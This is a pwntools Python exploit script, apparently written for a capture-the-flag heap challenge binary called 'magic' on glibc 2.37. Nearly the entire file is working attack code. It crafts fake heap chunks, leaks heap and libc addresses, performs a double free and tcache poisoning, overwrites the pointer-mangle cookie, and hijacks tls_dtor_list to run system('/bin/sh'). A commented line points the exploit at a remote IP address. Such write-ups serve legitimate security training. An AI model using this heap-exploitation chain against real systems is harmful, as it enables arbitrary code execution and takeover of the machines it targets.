#!/usr/bin/python3

from pwn import *

exe = ELF("magic", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.37.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "INFO"
isDebug = False

gs = '''
directory /opt/GLIBC_SOURCE_CODE
break create_spell
break remove_spell
break update_magic_numbers
break set_favorite_spell
break read_spell
disable
continue
'''

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def deobfuscate(x: int, l: int = 64) -> int:
    p = 0

    for i in range(l * 4, 0, -4):
        v1 = (x & (0xf << i)) >> i
        v2 = (p & (0xf << i + 12 )) >> i + 12  
        p |= (v1 ^ v2) << i

    return p

def obfuscate(ptr: int, addr: int) -> int:
	return ptr ^ (addr >> 12)

def create_spell(spell_description=b"fifth"):
	io.sendlineafter(b"> ", b"2")
	io.sendafter(b"Spell: ", spell_description)
	io.recv()

def update_magic_numbers(index_in_magic_numbers_array, magic_value_to_save):
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b"Index for magic number: ", f"{index_in_magic_numbers_array+1}".encode())
	io.sendlineafter(b"Magic number: ", f"{magic_value_to_save}".encode())
	io.recv()

def remove_spell(indexToRemove):
	io.sendlineafter(b"> ", b"3")
	io.sendlineafter(b"Index: ", str(indexToRemove).encode())
	io.recv()

def set_favorite_spell(spellIndex):
	io.sendlineafter(b"> ", b"5")
	io.sendlineafter(b"Index for Favorite spell: ", str(spellIndex).encode())
	io.recv()

def read_spell(num_of_bytes_to_read):
	io.sendlineafter(b"> ", b"4")
	result = io.recv(numb=num_of_bytes_to_read)
	return result

def exit_program_and_win():
	io.sendlineafter(b"> ", b"6")

def write_primitive():
	# Prepare allocations to feel up 0x100 tcache.
	for i in range(7):
		create_spell(b"t" * 0xf8) #(index 0-6)

	create_spell(b"u" * 0xf8)  # index 7 (when freed, will consolidate with freed victim chunk and becore twice as big in unsorted bin)
	create_spell(b"v" * 0xf8)  # index 8 - victim, we will overwrite its fd later on.
	create_spell(b"g" * 0xf8)  # guard post chunk to avoid consolidation

	# Fill up 0x100 tcache
	for i in range(7):
		remove_spell(i)

	remove_spell(8) # free the victim chunk to unsorted bin (tcache is full and size is above fastbins (I think))
	remove_spell(7) # free the prev chunk (above victim chunk). It will consolidate with the victim.

	create_spell(b"x" * 0xf8) # take one out of tcache

	# free victim again using vulnerability
	update_magic_numbers(0, -1)
	address_to_double_free = heap_base+ 0xaa0 # <-- set the address of the chunk we want to double free (no obfuscation needed)
	update_magic_numbers(2, address_to_double_free) 

	# double free it (will free magic_numbers[0])
	remove_spell(0)

	# Now we have the victim in the tcache AND the large unsorted bin is also overlapping with it. So its in both places.

	# Overwrite victim's fd by malloc'ing the large 0x200 unsoerted bin, padding to the correct address and setting fd value of what was victim chunk.
	pad = b"q" * 0xf8
	fake_header = p64(0x101)
	fd = p64(heap_base + 0x55c) # <-- TEMP value. Set the protected address which will be the target chunk (libc GOT perhaps?) 
	# fd = p64(obfuscate(libc_base + 0xaa0, heap_base + 0xaa0)) # <-- set the protected address which will be the target chunk: target, heap_base + <tcache bin address> ((libc GOT perhaps?))
	bk = p64(0xcafedeaf) # <-- not important for now.
	remainder = b"q" * (0x1f8 - (len(pad) + len(fake_header) + len(fd) + len(bk))) # <-- add remainder padding so malloc will use 0x1f8 size request)
	create_spell(pad + fake_header + fd + bk + remainder)

	# get rid of the chunk in 0x100 tcache....
	create_spell(b"y" * 0xf8) 

	# Next malloc of size 0x100 will get as a chunk pointing at some target address where we can set values such as a one_gadget.
	# create_spell(b"a" * 0xf8)

def leak_heap():
	# Create a spell in spells[0]. Its content should contain 3 fake chunk inside of it. Total size is 0x100.
	# First fake chunk: A 0x101 chunk. We need 3 chunks in tcache later on when we preform a tcache poisoning on the second chunk in the list.
	# Second fake chunk: A 0x101 chunk. When freed it will go into tcache and will place a heap pointer in fd. Needed for leaking the heap.
	# Third fake chunk: A 0x421 chunk. When freed successfully, it will be put into an unsortedbin and will place libc pointers in fd and bk. Needed for leaking libc
	total_size = 0xf8
	pad_0 = b"w" * 0x18
	fake_size_0 = p64(0x101)
	pad_1 = b"w" * 0x38
	fake_size_1 = p64(0x101)
	pad_2 = b"w" * 0x18
	fake_size_2 = p64(0x421)
	payload = pad_0 + fake_size_0 + pad_1 + fake_size_1 + pad_2 + fake_size_2
	payload_length = len(pad_0) + len(fake_size_0) + len(pad_1) + len(fake_size_1) + len(pad_2) + len(fake_size_2)
	pad_to_total_size = b"w" * (total_size - payload_length) 
	create_spell(payload + pad_to_total_size)
	
	# Create a second spell at spells[1]. When update_magic_numbers will be called, it will memset a
	# single byte in spells[1] to 0x00. It will then point to our second fake 0x100 chunk we crafted in the first allocation, spells[0].
	# To leak libc, we also want to add a libc address some how, to the same spells[0] chunk.
	# This way when we read the spells[0] chunk's content, we will leak both the fake chunk we crafted (we will free it to get
	# pointers to tcache) AND an unsortedbin chunk which will have libc addresses in fd and bk.
	# To craft that 0x420 chunk and free it to unsortedbin, we need to bypass some checks.
	# We need to craft 0x420 bytes above the fake chunk (in memory addresses), a fake prev_size and also make sure that the next chunk after
	# that fake prev_size, has its prev_in_use bit set.
	# So, we will add some garbage 0x100 chunks so we will have enough way to craft all the needed fake values 0x420 away from the start if
	# our fake 0x420 chunk. We will create 5 chunks for that. Each one with the size 0x100 (0xf8 actually). This will give us enough space
	# to set the needed values using each chunk's user data input. The first 3 are for actual space:
	for i in range(3):
		create_spell(p64(0x0) * (total_size // 8))
	
	# Allocate 4th chunk with the size of 0x100 that will contain the prev_size (0x421) + the next chunk's size, has to have its prev_in_use bit
	# set. (0x101)
	create_spell(p64(0x0) * 18 + p64(0x421) + p64(0x101) + b"w" * (total_size - 160))

	# Allocate the 5th chunk of size 0x100 and add to it a fake prev_size so it passes the 'corrupted size vs. prev_size' mitigation
	# The prev_size of the next chunk should be the same size of 0x421
	create_spell(p64(0x0) * 18 + p64(0x421) + b"w" * (total_size - 152))
	
	# Set spells[0] as the favorite spell. super_spell_len will be 0xf8 and we will be able to read from it.	
	set_favorite_spell(0)
	
	# we make sure to NOT update magic_number[1] or magic_number[3] so we will get the memset called on spells[1]
	update_magic_numbers(0, 0)
	
	# The chunk address in spells[1] now has its LSB overwritten with 0x00. So it points to our fake chunk inside spells[0].
	# We free that chunk and introduce a tcache fd address inside spells[0] chunk.
	remove_spell(1)
	
	# Now we read from our favorite spell chunk we set earlier, which includes inside it the fake chunk with heap_base address
	# at its fd.
	leaked_bytes = read_spell(num_of_bytes_to_read=0x1000)
	leaked_line = leaked_bytes.split(b"\n")[11]
	leaked_bytes = leaked_line[68:76]

	# We shift left because we need to add the 0x000 at the LSB side of the leaked value that were taken away when the pointer
	# was PROTECTED.
	address = u64(leaked_bytes) << 12
	print("Leaked heap base (hex): ", hex(address))

	return address

def leak_libc():
	# Now we attend to the second fake chunk we created of size 0x420.
	# We set spells[1] to point to that fake 0x420 chunk. This time using the heap leak to bypass ASLR.
	update_magic_numbers(1, -1)
	update_magic_numbers(3, heap_base + 0x320)

	# We remove it and the fake chunk (after passing all the checks), is put into unsortedbin and now we also have 
	# a libc address ready for grabbing.
	remove_spell(1)
	
	# We read again our favorite spell, and now it will output the heap leak AND the libc leak.
	leaked_bytes = read_spell(num_of_bytes_to_read=0x1000)
	leaked_line = leaked_bytes.split(b"\n")[12]
	leaked_bytes = leaked_line[48:54]
	
	address = u64(leaked_bytes.ljust(8, b"\x00"))
	libc.address = address - 0x1d3ce0
	print("Leaked libc base (hex): ", hex(libc.address))

def exploit():
	# prep write primitive
	update_magic_numbers(1, -1)
	update_magic_numbers(3, heap_base + 0x2c0)
	remove_spell(1)

	update_magic_numbers(1, -1)
	update_magic_numbers(3, heap_base + 0x2a0)
	remove_spell(1)

	# Set fake chunk's fd to point to ptr_managle_cookie
	ptr_mangle_cookie = libc.address - 0x2890
	target_address = p64(obfuscate(ptr_mangle_cookie, heap_base + 0x2c0))
	create_spell(p64(0) * 3 + p64(0x101) + target_address + p64(0x0) * 6 + p64(0x101) + p64(0x0) * 19)
	# Get rid of the chunk in 0x100 tcache to reach the fake chunk.
	create_spell(p64(0x0) * 7 + p64(0x101) + p64(0x0) * 20 + p64(0x101) + p64(0x0) * 2)

	# overwrite ptr_mangle_cookie
	create_spell(p64(0x0) * (0xf8 // 8))

	# prep write primitive again 
	update_magic_numbers(1, -1)
	update_magic_numbers(3, heap_base + 0x300)
	remove_spell(1)

	update_magic_numbers(1, -1)
	update_magic_numbers(3, heap_base + 0x2c0)
	remove_spell(1)

	update_magic_numbers(1, -1)
	update_magic_numbers(3, heap_base + 0x2a0)
	remove_spell(1)

	# ############# dtor_list..
	# set target_address as the fd of the fake chunk. We will allocate there soon.
	tls_dtor = libc.address - 0x2990
	target_address = p64(obfuscate(tls_dtor, heap_base + 0x2c0))
	create_spell(p64(0) * 3 + p64(0x101) + target_address + p64(0x0) * 6 + p64(0x101) + p64(0x0) * 19)
	# Get rid of the chunk in 0x100 tcache to reach the fake chunk.
	create_spell(p64(0x0) * 27 + p64(0x101) + p64(0x0) * 3)

	# Allocate fake chunk and set the target value in that location
	payload = p64(0x0) * 9
	payload += p64(libc.address + 0x1d4580)
	payload += p64(libc.address + 0x1dc440)
	payload += p64(0x0)
	payload += p64(libc.address + 0x17c4c0)
	payload += p64(libc.address + 0x17cac0)
	payload += p64(libc.address + 0x17d3c0)
	payload += p64(0x0)
	payload += p64(tls_dtor+0x80+0x8)
	payload += p64(libc.sym["system"] << 0x11)
	payload += p64(next(libc.search(b"/bin/sh\x00")))
	payload += p64(0x0) * 1
	payload += p64(libc.address + 0x1d3c80)
	payload += p64(0x0) * 5
	payload += p64(tls_dtor + 0xd0)
	payload += p64(tls_dtor + 0x9a0 + 0xd0)
	payload += p64(tls_dtor + 0xd0)
	payload += p64(0x0) * 2

	create_spell(payload)
	exit_program_and_win()


#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
io = start_local(isDebug)

######## REMOTE ########
# io = remote("94.237.62.252", 57945)
io.timeout = 0.02

# Get 'power' = 4
io.sendlineafter(b"> ", b"magic_charm")

heap_base = leak_heap() # 6 allocations
leak_libc() # 0 allocations
exploit() # 6 allocations

io.interactive()
